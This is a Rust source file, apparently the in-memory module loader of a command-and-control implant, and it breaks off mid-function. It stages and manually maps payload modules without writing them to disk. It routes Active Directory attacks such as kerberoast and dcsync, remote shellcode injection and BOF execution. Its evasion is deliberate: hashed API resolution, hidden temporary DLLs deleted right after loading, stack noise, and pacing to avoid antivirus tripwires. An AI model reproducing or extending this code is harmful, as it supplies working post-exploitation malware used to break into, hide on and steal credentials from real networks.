// Stage0 module loader (L2).
//
// Pipeline: stage (CKMS bytes) → verify HMAC → load
//   Classic BOF module (`bof`, cupcake-mod-bof):
//     Manual-Map in-process (fileless) → mod_invoke("bof_exec") runs COFF in the
//     agent process. Staged on demand so Stage0 carries no BOF/Beacon signatures.
//   Product worker modules (inject / ad):
//     register with ModuleSupervisor only — NEVER mapped into Stage0; spawned as
//     self-contained sacrificial worker EXEs under a Job Object.
//   Non-product / legacy test modules:
//     Manual-Map / short disk LoadLibrary → mod_invoke → unload.
//
// Isolation: docs/MODULE_WORKER_ISOLATION.md
// OPSEC: load only on operator demand; unload drops mappings/handles.

use crate::module_package::{self, unpack_and_verify};
use crate::types::CommandResult;
use log::{debug, info};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::{Mutex, OnceLock};

/// Logical module identifiers (server module_id).
pub const MOD_SHELL: &str = "shell";
pub const MOD_FS: &str = "fs";
pub const MOD_PROC: &str = "proc";
pub const MOD_SOCKS: &str = "socks";
pub const MOD_PLUGIN: &str = "plugin";
/// Classic in-process BOF engine (cupcake-mod-bof) — Manual-Map, fileless.
pub const MOD_BOF: &str = "bof";
/// Remote process shellcode inject — L2 only (`modules/inject`, self-contained worker EXE)
pub const MOD_INJECT: &str = "inject";
/// Active Directory sacrificial worker PE — L2 only (`modules/ad`); never Stage0 roast/LDAP
pub const MOD_AD: &str = "ad";

/// Design-table AD command types (docs/AD_MODULE_DESIGN.md). Explicit list — no `ad_*` glob.
pub const AD_COMMAND_TYPES: &[&str] = &[
    "ad_discover",
    "ad_ldap_query",
    "ad_enum_users",
    "ad_enum_groups",
    "ad_enum_privileged_groups",
    "ad_enum_computers",
    "ad_enum_spns",
    "ad_enum_trusts",
    "ad_password_policy",
    "ad_enum_delegation",
    "ad_enum_gpo",
    "ad_collect_sessions",
    "kerberoast",
    "asrep_roast",
    "dcsync",
    "ad_check_replication_rights",
    "ad_graph_collect",
    "ad_acl_collect",
    // Scaffold probe (worker health); not a domain attack
    "ad_ping",
];

/// True when command_type is gated on L2 `ad` (excludes Stage0-local wipe if any).
pub fn is_ad_command(command_type: &str) -> bool {
    AD_COMMAND_TYPES.iter().any(|&c| c == command_type)
}

/// Windows-only product modules. These must never be staged/loaded on non-Windows.
pub const WINDOWS_ONLY_MODULES: &[&str] = &[MOD_AD, MOD_INJECT, MOD_BOF];

/// Runtime guard: is this module id allowed on the current OS?
/// Uses compile-time cfg for Stage0 build target + explicit list.
pub fn is_module_supported_on_current_os(mod_id: &str) -> bool {
    let id = mod_id.to_ascii_lowercase();
    if WINDOWS_ONLY_MODULES.iter().any(|&w| w.eq_ignore_ascii_case(&id)) {
        #[cfg(target_os = "windows")]
        { return true; }
        #[cfg(not(target_os = "windows"))]
        { return false; }
    }
    // Default: allow (shell/fs/proc etc. are builtin; unknown customs left to caller policy).
    true
}

/// Map command_type → required L2 module.
///
/// Daily ops (shell / file / process) are **built into** post-ex / minimal profiles —
/// they return None (no module load). Only heavy capabilities are module-gated.
pub fn module_for_command(command_type: &str) -> Option<&'static str> {
    if is_ad_command(command_type) {
        return Some(MOD_AD);
    }
    match command_type {
        // Built-in when feature post-ex is enabled (reverse product = minimal)
        "shell"
        | "shell_interactive"
        | "file_list"
        | "file_ls"
        | "file_upload"
        | "file_download"
        | "file_upload_chunk"
        | "file_download_chunk"
        | "file_delete"
        | "file_mkdir"
        | "process_list"
        | "process_kill" => None,
        // Classic BOF: in-process mod_bof (Manual-Map, fileless). The engine is
        // staged on demand so Stage0 ships without BOF/Beacon signatures.
        "bof_exec" => Some(MOD_BOF),
        // .NET execution retired — operators convert assemblies to shellcode
        // (e.g. Donut) and use the inject module instead.
        "execute_assembly" => None,
        "plugin_cache" | "plugin_exec" => Some(MOD_PLUGIN),
        // Process inject: never Stage0 — always L2 mod_inject (worker EXE)
        "process_inject" | "shellcode_inject" | "inject_shellcode" | "inject" => Some(MOD_INJECT),
        // Stage0-local artifact wipe path (no worker); no module gate
        "ad_artifact_wipe" => None,
        _ => None,
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ModuleMeta {
    pub id: String,
    pub version: String,
    pub os: String,
    pub arch: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ModuleState {
    Absent,
    /// Bytes received, not yet mapped
    Staged,
    Loaded,
    Failed,
}

/// C ABI of L2 modules (mod_shell, …).
type ModInitFn = unsafe extern "C" fn() -> i32;
type ModInvokeFn = unsafe extern "C" fn(
    cmd_type: *const u8,
    cmd_type_len: u32,
    payload: *const u8,
    payload_len: u32,
    out_ptr: *mut *mut u8,
    out_len: *mut u32,
) -> i32;
type ModFreeFn = unsafe extern "C" fn(ptr: *mut u8, len: u32);
type ModShutdownFn = unsafe extern "C" fn() -> i32;

struct LoadedModule {
    /// Image base (Manual-Map) or HMODULE (LoadLibrary). 0 = not a PE module (test/hosted).
    handle: usize,
    /// Size of Manual-Map image (0 for LoadLibrary / hosted).
    mapped_size: usize,
    /// True when loaded via pe_map (no FreeLibrary; wipe+NtFree on unload).
    mem_mapped: bool,
    /// DllMain was called on Manual-Map attach (detach on unload).
    dll_main_called: bool,
    temp_path: Option<PathBuf>,
    mod_init: Option<ModInitFn>,
    mod_invoke: Option<ModInvokeFn>,
    mod_free: Option<ModFreeFn>,
    mod_shutdown: Option<ModShutdownFn>,
}

struct ModuleEntry {
    meta: ModuleMeta,
    state: ModuleState,
    /// Staged CKMS blob (cleared after successful load to reduce memory footprint)
    staged: Option<Vec<u8>>,
    /// Verified PE payload (kept briefly during load)
    payload: Option<Vec<u8>>,
    loaded: Option<LoadedModule>,
}

/// Process-wide module registry (Stage0).
pub struct ModuleRegistry {
    entries: Mutex<HashMap<String, ModuleEntry>>,
    /// Override key for tests; None → derive from agent AES key / default.
    key_override: Mutex<Option<[u8; 32]>>,
}

impl Default for ModuleRegistry {
    fn default() -> Self {
        Self {
            entries: Mutex::new(HashMap::new()),
            key_override: Mutex::new(None),
        }
    }
}

pub fn registry() -> &'static ModuleRegistry {
    static REGISTRY: OnceLock<ModuleRegistry> = OnceLock::new();
    REGISTRY.get_or_init(ModuleRegistry::default)
}

/// Lock helper (tests + recovery). Production paths use `.lock().ok()` / map_err.
#[cfg(test)]
fn lock_map<'a, T>(m: &'a std::sync::Mutex<T>, what: &str) -> std::sync::MutexGuard<'a, T> {
    match m.lock() {
        Ok(g) => g,
        Err(poisoned) => {
            log::warn!("mutex poisoned ({what}), recovering");
            poisoned.into_inner()
        }
    }
}

fn module_key() -> [u8; 32] {
    if let Ok(g) = registry().key_override.lock() {
        if let Some(k) = *g {
            return k;
        }
    }
    // Primary: same material as transport AES (get_aes_key already includes salt KDF)
    let aes = crate::config::get_aes_key();
    if aes.len() >= 16 {
        return module_package::derive_module_key(&aes);
    }
    // Release builds must not silently share a hard-coded default HMAC key.
    if module_package::default_module_key_allowed() {
        return module_package::default_module_key();
    }
    // Last resort: derive from empty seed so process does not use the static default string.
    module_package::derive_module_key(b"cupcake-missing-aes-key")
}

/// Candidate keys for verify — tolerate server/agent historical mismatches.
fn module_key_candidates() -> Vec<[u8; 32]> {
    let mut out = Vec::new();
    let mut push = |k: [u8; 32]| {
        if !out.iter().any(|x| x == &k) {
            out.push(k);
        }
    };
    // Primary: derive_module_key(get_aes_key())  — get_aes_key = base+salt KDF
    push(module_key());
    // Fallback: some older packers used base AES only (no salt KDF)
    let base = crate::config::get_aes_key_base();
    if base.len() >= 16 {
        push(module_package::derive_module_key(&base));
    }
    // Debug/test only: tolerate historical default key material for unpatched builds.
    // Release never falls back to the hard-coded default (shared-key risk).
    if module_package::default_module_key_allowed() {
        push(module_package::default_module_key());
    }
    out
}

impl ModuleRegistry {
    /// Tests / offline pack: force module HMAC key.
    pub fn set_key_override(&self, key: Option<[u8; 32]>) {
        if let Ok(mut g) = self.key_override.lock() {
            *g = key;
        }
    }

    pub fn is_loaded(&self, id: &str) -> bool {
        self.entries
            .lock()
            .map(|g| {
                g.get(id)
                    .map(|e| e.state == ModuleState::Loaded)
                    .unwrap_or(false)
            })
            .unwrap_or(false)
    }

    pub fn list_loaded(&self) -> Vec<String> {
        self.entries
            .lock()
            .map(|g| {
                g.iter()
                    .filter(|(_, e)| e.state == ModuleState::Loaded)
                    .map(|(k, e)| {
                        let mode = if crate::module_supervisor::is_product_worker_module(k) {
                            "worker"
                        } else if e.loaded.as_ref().map(|l| l.mem_mapped).unwrap_or(false) {
                            "mem"
                        } else if e.loaded.as_ref().map(|l| l.handle == 0).unwrap_or(false) {
                            "stub"
                        } else if e.loaded.is_none() {
                            "worker"
                        } else {
                            "legacy"
                        };
                        format!("{k}:{mode}")
                    })
                    .collect()
            })
            .unwrap_or_default()
    }

    /// How a loaded module is resident: worker | mem | legacy | stub | absent
    ///
    /// `worker` = not mapped into Stage0 (process-isolated worker EXE).
    pub fn load_mode_of(&self, id: &str) -> &'static str {
        self.entries
            .lock()
            .ok()
            .and_then(|g| {
                g.get(id).map(|e| {
                    if e.state != ModuleState::Loaded {
                        return "absent";
                    }
                    if crate::module_supervisor::is_product_worker_module(id) {
                        return "worker";
                    }
                    match e.loaded.as_ref() {
                        Some(l) if l.mem_mapped => "mem",
                        Some(l) if l.handle == 0 => "stub",
                        Some(_) => "legacy",
                        None => "worker",
                    }
                })
            })
            .unwrap_or("absent")
    }

    pub fn note_required(&self, id: &str) {
        info!("[module_loader] module required: {}", id);
        if let Ok(mut g) = self.entries.lock() {
            g.entry(id.to_string()).or_insert_with(|| empty_entry(id));
        }
    }

    /// Store CKMS package bytes for later load.
    pub fn stage_bytes(&self, id: &str, bytes: &[u8]) -> Result<(), String> {
        if bytes.is_empty() {
            return Err("empty module blob".into());
        }
        let mut g = self
            .entries
            .lock()
            .map_err(|_| "registry lock".to_string())?;
        let e = g.entry(id.to_string()).or_insert_with(|| empty_entry(id));
        e.staged = Some(bytes.to_vec());
        e.state = ModuleState::Staged;
        e.payload = None;
        debug!(
            "[module_loader] staged module {} ({} bytes)",
            id,
            bytes.len()
        );
        Ok(())
    }

    /// Verify staged CKMS, then either:
    /// - product worker: register PE with ModuleSupervisor (no map / no mod_init)
    /// - legacy: map PE + mod_init
    pub fn load(&self, id: &str) -> Result<(), String> {
        let blob = {
            let mut g = self
                .entries
                .lock()
                .map_err(|_| "registry lock".to_string())?;
            let e = g
                .get_mut(id)
                .ok_or_else(|| format!("module_required:{id}"))?;
            // Already resident: in-process PE or product worker registration
            if e.state == ModuleState::Loaded
                && (e.loaded.is_some()
                    || crate::module_supervisor::is_product_worker_module(id))
            {
                return Ok(());
            }
            e.staged
                .take()
                .ok_or_else(|| format!("module_required:{id} (not staged)"))?
        };

        // Try primary + fallback keys (session-derived vs default vs legacy)
        let (pkg_id, payload) = {
            let mut last_err = "HMAC verify failed".to_string();
            let mut ok: Option<(String, Vec<u8>)> = None;
            for k in module_key_candidates() {
                match unpack_and_verify(&blob, &k) {
                    Ok(v) => {
                        ok = Some(v);
                        break;
                    }
                    Err(e) => last_err = e,
                }
            }
            ok.ok_or_else(|| {
                format!(
                    "module verify failed for {id}: {last_err} (check AES/salt match listener; rebuild agent with same key)"
                )
            })?
        };
        if pkg_id != id {
            return Err(format!(
                "module id mismatch: package={pkg_id} expected={id}"
            ));
        }

        // ── Product workers: NEVER map into Stage0 ──────────────────────────
        // inject / ad → ModuleSupervisor only (self-contained worker EXEs).
        if crate::module_supervisor::is_product_worker_module(id) {
            return self.load_product_worker(id, payload);
        }

        // Legacy in-process .NET runtime retired — operators use shellcode + inject.
        if matches!(
            id,
            "dotnet" | "mod_dotnet" | "cupcake_mod_dotnet"
        ) {
            return Err(format!(
                "module forbidden: {id} (.NET runtime retired; convert assembly to shellcode and use module inject)"
            ));
        }

        // Hosted/test payload: magic "HOST" + nothing — mark loaded without PE
        if payload.starts_with(b"HOST") && payload.len() <= 8 {
            let mut g = self
                .entries
                .lock()
                .map_err(|_| "registry lock".to_string())?;
            let e = g.entry(id.to_string()).or_insert_with(|| empty_entry(id));
            e.state = ModuleState::Loaded;
            e.payload = None;
            e.loaded = Some(LoadedModule {
                handle: 0,
                mapped_size: 0,
                mem_mapped: false,
                dll_main_called: false,
                temp_path: None,
                mod_init: None,
                mod_invoke: None,
                mod_free: None,
                mod_shutdown: None,
            });
            info!("[module_loader] loaded hosted stub module {}", id);
            return Ok(());
        }

        crate::utils::db_print(&format!(
            "[module_loader] mapping module {id}: {} bytes",
            payload.len()
        ));
        let loaded = map_pe_module(&payload).map_err(|e| {
            let mut g = self.entries.lock().ok();
            if let Some(ref mut g) = g {
                if let Some(ent) = g.get_mut(id) {
                    ent.state = ModuleState::Failed;
                }
            }
            e
        })?;
        crate::utils::db_print(&format!(
            "[module_loader] mapped module {id}: base=0x{:X} mem_mapped={}",
            loaded.handle, loaded.mem_mapped
        ));

        // Zeroize PE bytes after map (best-effort; local copy only)
        let mut payload = payload;
        for b in payload.iter_mut() {
            *b = 0;
        }
        drop(payload);

        // init entry (x0)
        if let Some(init) = loaded.mod_init {
            crate::utils::db_print(&format!("[module_loader] calling mod_init (x0) for {id}"));
            let rc = unsafe { init() };
            crate::utils::db_print(&format!("[module_loader] mod_init rc={} for {id}", rc));
            if rc != 0 {
                let _ = unmap_loaded(&loaded);
                return Err(format!("module init failed rc={rc}"));
            }
        }

        let via = if loaded.mem_mapped {
            "mem-map"
        } else {
            "loadlibrary"
        };
        let mut g = self
            .entries
            .lock()
            .map_err(|_| "registry lock".to_string())?;
        let e = g.entry(id.to_string()).or_insert_with(|| empty_entry(id));
        e.state = ModuleState::Loaded;
        e.payload = None;
        e.staged = None;
        e.loaded = Some(loaded);
        info!("[module_loader] loaded module {} via {}", id, via);
        Ok(())
    }

    /// Product path: verify already done; register worker PE with supervisor
    /// (CreateProcess-capable EXE; never mapped into Stage0).
    fn load_product_worker(&self, id: &str, payload: Vec<u8>) -> Result<(), String> {
        if payload.len() < 64 || payload[0] != b'M' || payload[1] != b'Z' {
            return Err(format!("product module {id} payload is not a PE"));
        }

        // Register with supervisor (state = worker_ready; no map)
        crate::module_supervisor::supervisor()
            .register_pe(id, &payload)
            .map_err(|e| {
                if let Ok(mut g) = self.entries.lock() {
                    if let Some(ent) = g.get_mut(id) {
                        ent.state = ModuleState::Failed;
                    }
                }
                e
            })?;

        let mut g = self
            .entries
            .lock()
            .map_err(|_| "registry lock".to_string())?;
        let e = g.entry(id.to_string()).or_insert_with(|| empty_entry(id));
        e.state = ModuleState::Loaded;
        e.staged = None;
        e.payload = None;
        e.loaded = None; // never holds a mapped handle for product modules
        // zeroize local copy — supervisor has its own clone
        let mut payload = payload;
        for b in payload.iter_mut() {
            *b = 0;
        }
        drop(payload);
        drop(g);
        info!(
            "[module_loader] product worker {} registered (worker_ready, not mapped)",
            id
        );
        Ok(())
    }

    /// Invoke loaded module. Returns JSON stdout/stderr style result.
    pub fn invoke(
        &self,
        id: &str,
        cmd_type: &str,
        payload: &[u8],
    ) -> Result<CommandResult, String> {
        let (invoke, free_fn) = {
            let g = self
                .entries
                .lock()
                .map_err(|_| "registry lock".to_string())?;
            let e = g
                .get(id)
                .ok_or_else(|| format!("module not loaded: {id}"))?;
            if e.state != ModuleState::Loaded {
                return Err(format!("module not loaded: {id}"));
            }
            let loaded = e
                .loaded
                .as_ref()
                .ok_or_else(|| format!("module handle missing: {id}"))?;
            // Hosted stub: no PE — used only in unit tests
            if loaded.handle == 0 && loaded.mod_invoke.is_none() {
                return Ok(CommandResult {
                    stdout: format!("hosted:{id}:{cmd_type}"),
                    stderr: String::new(),
                    path: None,
                    req_id: None,
                });
            }
            let inv = loaded
                .mod_invoke
                .ok_or_else(|| format!("module invoke missing: {id}"))?;
            (inv, loaded.mod_free)
        };

        let ct = cmd_type.as_bytes();
        let mut out_ptr: *mut u8 = std::ptr::null_mut();
        let mut out_len: u32 = 0;
        let rc = unsafe {
            invoke(
                ct.as_ptr(),
                ct.len() as u32,
                payload.as_ptr(),
                payload.len() as u32,
                &mut out_ptr,
                &mut out_len,
            )
        };
        if rc != 0 {
            return Err(format!("module invoke rc={rc}"));
        }
        if out_ptr.is_null() || out_len == 0 {
            return Ok(CommandResult {
                stdout: String::new(),
                stderr: String::new(),
                path: None,
                req_id: None,
            });
        }
        // Cap module-reported out_len before forming a slice (malicious/buggy modules).
        const MAX_MODULE_OUT: u32 = 64 * 1024 * 1024; // 64 MiB
        if out_len > MAX_MODULE_OUT {
            if let Some(free) = free_fn {
                unsafe { free(out_ptr, out_len) };
            }
            return Err(format!(
                "module invoke out_len={out_len} exceeds sanity cap {MAX_MODULE_OUT}"
            ));
        }
        let bytes = unsafe { std::slice::from_raw_parts(out_ptr, out_len as usize) }.to_vec();
        if let Some(free) = free_fn {
            unsafe { free(out_ptr, out_len) };
        } else {
            // Best-effort: module should export the free entry (x2)
            unsafe {
                let _ = Box::from_raw(std::ptr::slice_from_raw_parts_mut(
                    out_ptr,
                    out_len as usize,
                ));
            }
        }

        parse_module_result(&bytes)
    }

    /// Unload + free library + delete residual temp file.
    /// Product workers: unregister supervisor state only (nothing mapped in-agent).
    pub fn unload(&self, id: &str) -> Result<(), String> {
        if crate::module_supervisor::is_product_worker_module(id) {
            crate::module_supervisor::supervisor().unregister(id);
        }
        let mut g = self
            .entries
            .lock()
            .map_err(|_| "registry lock".to_string())?;
        if let Some(e) = g.get_mut(id) {
            if let Some(loaded) = e.loaded.take() {
                if let Some(shutdown) = loaded.mod_shutdown {
                    let _ = unsafe { shutdown() };
                }
                let _ = unmap_loaded(&loaded);
            }
            e.state = ModuleState::Absent;
            e.staged = None;
            e.payload = None;
            info!("[module_loader] unloaded {}", id);
        }
        Ok(())
    }
}

fn empty_entry(id: &str) -> ModuleEntry {
    ModuleEntry {
        meta: ModuleMeta {
            id: id.to_string(),
            version: "0.1.0".into(),
            os: std::env::consts::OS.into(),
            arch: std::env::consts::ARCH.into(),
        },
        state: ModuleState::Absent,
        staged: None,
        payload: None,
        loaded: None,
    }
}

fn parse_module_result(bytes: &[u8]) -> Result<CommandResult, String> {
    // Prefer JSON: {"stdout":"...","stderr":"...","path":null}
    if let Ok(v) = serde_json::from_slice::<serde_json::Value>(bytes) {
        return Ok(CommandResult {
            stdout: v
                .get("stdout")
                .and_then(|x| x.as_str())
                .unwrap_or("")
                .to_string(),
            stderr: v
                .get("stderr")
                .and_then(|x| x.as_str())
                .unwrap_or("")
                .to_string(),
            path: v
                .get("path")
                .and_then(|x| x.as_str())
                .map(|s| s.to_string()),
            req_id: None,
        });
    }
    Ok(CommandResult {
        stdout: String::from_utf8_lossy(bytes).into_owned(),
        stderr: String::new(),
        path: None,
        req_id: None,
    })
}

/// Map PE: prefer Manual-Map (`mem-map`); fall back to short-lived temp + LoadLibrary.
fn map_pe_module(pe: &[u8]) -> Result<LoadedModule, String> {
    if pe.len() < 64 {
        return Err("payload too small for PE".into());
    }
    // MZ check
    if pe[0] != b'M' || pe[1] != b'Z' {
        return Err("payload is not a PE (MZ missing)".into());
    }

    #[cfg(windows)]
    {
        map_pe_windows(pe)
    }
    #[cfg(not(windows))]
    {
        map_pe_unix(pe)
    }
}

#[cfg(all(windows, feature = "mem-map"))]
fn map_pe_windows(pe: &[u8]) -> Result<LoadedModule, String> {
    if crate::pe_map::mem_map_enabled() {
        match crate::pe_map::map_pe(pe) {
            Ok(m) => {
                return Ok(LoadedModule {
                    handle: m.base,
                    mapped_size: m.size,
                    mem_mapped: true,
                    dll_main_called: m.dll_main_called,
                    temp_path: None,
                    mod_init: m.mod_init,
                    mod_invoke: m.mod_invoke,
                    mod_free: m.mod_free,
                    mod_shutdown: m.mod_shutdown,
                });
            }
            Err(e) => {
                if crate::pe_map::mem_map_strict() {
                    return Err(format!("mem-map strict: {e}"));
                }
                log::warn!("[module_loader] mem-map failed, fallback LoadLibrary: {e}");
                crate::utils::db_print(&format!(
                    "[module_loader] mem-map failed, fallback LoadLibrary: {e}"
                ));
            }
        }
    }
    map_pe_windows_loadlibrary(pe)
}

#[cfg(all(windows, not(feature = "mem-map")))]
fn map_pe_windows(pe: &[u8]) -> Result<LoadedModule, String> {
    map_pe_windows_loadlibrary(pe)
}

/// Write PE to short-lived temp path, LoadLibrary, resolve exports, delete file.
#[cfg(windows)]
fn map_pe_windows_loadlibrary(pe: &[u8]) -> Result<LoadedModule, String> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;

    // Space out image-load events (burst LoadLibrary is a common AV tripwire)
    crate::utils::opsec_heavy_pace();

    let mut path = crate::utils::opsec_staging_dir();
    let _ = std::fs::create_dir_all(&path);
    // Neutral cache-like name (avoid cpx_/product prefixes)
    path.push(crate::utils::opsec_stage_name("dll"));

    std::fs::write(&path, pe).map_err(|e| format!("write temp module: {e}"))?;
    // Best-effort hide + temporary attribute
    {
        let wide: Vec<u16> = path.as_os_str().encode_wide().chain(Some(0)).collect();
        unsafe {
            type SetFileAttributesWFn = unsafe extern "system" fn(*const u16, u32) -> i32;
            let k32 =
                crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
            if let Some(addr) = crate::stealth::get_api_addr(
                k32,
                crate::stealth::hash_api_name(b"SetFileAttributesW"),
            ) {
                let f: SetFileAttributesWFn = std::mem::transmute(addr);
                let _ = f(wide.as_ptr(), 0x0000_0102); // HIDDEN | TEMPORARY
            }
        }
    }

    type LoadLibraryWFn = unsafe extern "system" fn(*const u16) -> *mut core::ffi::c_void;
    type GetProcAddressFn =
        unsafe extern "system" fn(*mut core::ffi::c_void, *const i8) -> *mut core::ffi::c_void;
    type FreeLibraryFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;

    let (load_lib, get_proc, free_lib) = unsafe {
        let k32 =
            crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
        if k32 == 0 {
            let _ = std::fs::remove_file(&path);
            return Err("kernel32 not found".into());
        }
        let ll = crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"LoadLibraryW"))
            .ok_or_else(|| {
                let _ = std::fs::remove_file(&path);
                "LoadLibraryW missing".to_string()
            })?;
        let gp =
            crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"GetProcAddress"))
                .ok_or_else(|| {
                    let _ = std::fs::remove_file(&path);
                    "GetProcAddress missing".to_string()
                })?;
        let fl = crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"FreeLibrary"))
            .ok_or_else(|| {
            let _ = std::fs::remove_file(&path);
            "FreeLibrary missing".to_string()
        })?;
        (
            std::mem::transmute::<usize, LoadLibraryWFn>(ll),
            std::mem::transmute::<usize, GetProcAddressFn>(gp),
            std::mem::transmute::<usize, FreeLibraryFn>(fl),
        )
    };

    let wide: Vec<u16> = OsStr::new(&path)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();
    // OPSEC: brief stack noise before LoadLibrary (heavy modules)
    #[cfg(all(windows, target_arch = "x86_64"))]
    {
        crate::stealth::stack::add_stack_noise();
    }

    let handle = unsafe { load_lib(wide.as_ptr()) };
    // Delete on disk ASAP (mapping retained by loader) — reduce on-disk dwell
    let _ = std::fs::remove_file(&path);
    // Best-effort overwrite empty if file reappeared (rare)
    let _ = std::fs::write(&path, b"");
    let _ = std::fs::remove_file(&path);

    if handle.is_null() {
        return Err("LoadLibraryW failed".into());
    }

    unsafe fn resolve(
        get_proc: GetProcAddressFn,
        handle: *mut core::ffi::c_void,
        name: &[u8],
    ) -> Option<usize> {
        let mut buf = Vec::with_capacity(name.len() + 1);
        buf.extend_from_slice(name);
        buf.push(0);
        let p = get_proc(handle, buf.as_ptr() as *const i8);
        if p.is_null() {
            None
        } else {
            Some(p as usize)
        }
    }

    // Neutral ABI names: x0=init, x1=invoke, x2=free, x3=shutdown (see modules/bof).
    let mod_init =
        unsafe { resolve(get_proc, handle, b"x0").map(|a| std::mem::transmute(a)) };
    let mod_invoke =
        unsafe { resolve(get_proc, handle, b"x1").map(|a| std::mem::transmute(a)) };
    let mod_free =
        unsafe { resolve(get_proc, handle, b"x2").map(|a| std::mem::transmute(a)) };
    let mod_shutdown =
        unsafe { resolve(get_proc, handle, b"x3").map(|a| std::mem::transmute(a)) };

    if mod_invoke.is_none() {
        unsafe {
            free_lib(handle);
        }
        return Err("required export missing".into());
    }

    // Keep free_lib via handle; FreeLibrary on unload
    let _ = free_lib; // silence if unused path

    Ok(LoadedModule {
        handle: handle as usize,
        mapped_size: 0,
        mem_mapped: false,
        dll_main_called: false,
        temp_path: Some(path), // may already be deleted
        mod_init,
        mod_invoke,
        mod_free,
        mod_shutdown,
    })
}

#[cfg(not(windows))]
fn map_pe_unix(pe: &[u8]) -> Result<LoadedModule, String> {
    // Linux: short-lived .so + dlopen
    let mut path = std::env::temp_dir();
    let name = format!(
        "cpx_{:08x}_{:04x}.so",
        crate::utils::next_u32(),
        (crate::utils::next_u32() & 0xffff) as u16
    );
    path.push(name);
    std::fs::write(&path, pe).map_err(|e| format!("write temp module: {e}"))?;

    unsafe {
        let cpath = std::ffi::CString::new(path.to_string_lossy().as_bytes())
            .map_err(|_| "path cstring".to_string())?;
        let handle = libc::dlopen(cpath.as_ptr(), libc::RTLD_NOW);
        let _ = std::fs::remove_file(&path);
        if handle.is_null() {
            return Err("dlopen failed".into());
        }
        let inv_name = std::ffi::CString::new("mod_invoke").unwrap();
        let inv = libc::dlsym(handle, inv_name.as_ptr());
        if inv.is_null() {
            libc::dlclose(handle);
            return Err("export mod_invoke not found".into());
        }
        let init_name = std::ffi::CString::new("mod_init").unwrap();
        let free_name = std::ffi::CString::new("mod_free").unwrap();
        let shut_name = std::ffi::CString::new("mod_shutdown").unwrap();
        let init = libc::dlsym(handle, init_name.as_ptr());
        let free = libc::dlsym(handle, free_name.as_ptr());
        let shut = libc::dlsym(handle, shut_name.as_ptr());

        Ok(LoadedModule {
            handle: handle as usize,
            mapped_size: 0,
            mem_mapped: false,
            dll_main_called: false,
            temp_path: Some(path),
            mod_init: if init.is_null() {
                None
            } else {
                Some(std::mem::transmute(init))
            },
            mod_invoke: Some(std::mem::transmute(inv)),
            mod_free: if free.is_null() {
                None
            } else {
                Some(std::mem::transmute(free))
            },
            mod_shutdown: if shut.is_null() {
                None
            } else {
                Some(std::mem::transmute(shut))
            },
        })
    }
}

fn unmap_loaded(loaded: &LoadedModule) -> Result<(), String> {
    if loaded.handle == 0 {
        return Ok(());
    }
    #[cfg(all(windows, feature = "mem-map"))]
    if loaded.mem_mapped {
        crate::pe_map::unmap_image(loaded.handle, loaded.mapped_size, loaded.dll_main_called);
        return Ok(());
    }
    #[cfg(windows)]
    {
        type FreeLibraryFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
        unsafe {
            let k32 =
                crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
            if k32 != 0 {
                if let Some(addr) =
                    crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"FreeLibrary"))
                {
                    let free_lib: FreeLibraryFn = std::mem::transmute(addr);
                    free_lib(loaded.handle as *mut core::ffi::c_void);
                }
            }
        }
    }
    #[cfg(not(windows))]
    {
        unsafe {
            libc::dlclose(loaded.handle as *mut core::ffi::c_void);
        }
    }
    if let Some(ref p) = loaded.temp_path {
        let _ = std::fs::remove_file(p);
    }
    Ok(())
}

/// Ensure command's module is loaded; fails with module_required if absent/not staged.
/// Also performs a hard platform gate: on non-Windows we refuse to request windows-only
/// modules (ad, inject, bof). This prevents display/start mismatches.
pub fn ensure_module_for_command(command_type: &str) -> Result<(), String> {
    let Some(mod_id) = module_for_command(command_type) else {
        return Ok(());
    };
    // Runtime OS gate (defense in depth — even if server filtered, a misrouted command is rejected locally)
    if !is_module_supported_on_current_os(mod_id) {
        return Err(format!(
            "module_unsupported_on_os:{}:current_os={}",
            mod_id,
            std::env::consts::OS
        ));
    }
    if registry().is_loaded(mod_id) {
        return Ok(());
    }
    registry().note_required(mod_id);
    // Try load if already staged
    match registry().load(mod_id) {
        Ok(()) => Ok(()),
        Err(e) if e.contains("module_required") || e.contains("not staged") => {
            Err(format!("module_required:{mod_id}"))
        }
        Err(e) => Err(e),
    }
}

/// Optional L2 shell module invoke (legacy/experimental). Daily reverse uses built-in post-ex.

/// Guard staging / load of a module id against current OS.
/// Returns Err if the module is known to be unsupported here (e.g. ad/inject on linux).
pub fn ensure_module_supported(mod_id: &str) -> Result<(), String> {
    if !is_module_supported_on_current_os(mod_id) {
        return Err(format!(
            "module_unsupported_on_os:{}:current_os={}",
            mod_id,
            std::env::consts::OS
        ));
    }
    Ok(())
}
pub fn invoke_shell(command: &str) -> Result<CommandResult, String> {
    if !registry().is_loaded(MOD_SHELL) {
        return Err("module_required:shell".into());
    }
    registry().invoke(MOD_SHELL, "shell", command.as_bytes())
}

/// Invoke loaded `bof` module with base64 COFF + optional base64 args (JSON envelope).
/// Classic BOF path: COFF executes **in the agent process** via mod_bof (Manual-Mapped,
/// fileless, no sacrificial process).
pub fn invoke_bof(coff: &[u8], args: &[u8]) -> Result<CommandResult, String> {
    ensure_module_for_command("bof_exec")?;
    let data_b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, coff);
    let args_b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, args);
    let payload = serde_json::json!({
        "data": data_b64,
        "args": args_b64,
    });
    let bytes = serde_json::to_vec(&payload).map_err(|e| e.to_string())?;
    registry().invoke(MOD_BOF, "bof_exec", &bytes)
}

/// Invoke inject via **inject worker process** (self-contained worker EXE).
/// Stage0 never maps inject logic in-process.
pub fn invoke_inject(
    pid: u32,
    shellcode: &[u8],
    method: &str,
    wait_ms: u32,
) -> Result<CommandResult, String> {
    ensure_module_for_command("process_inject")?;
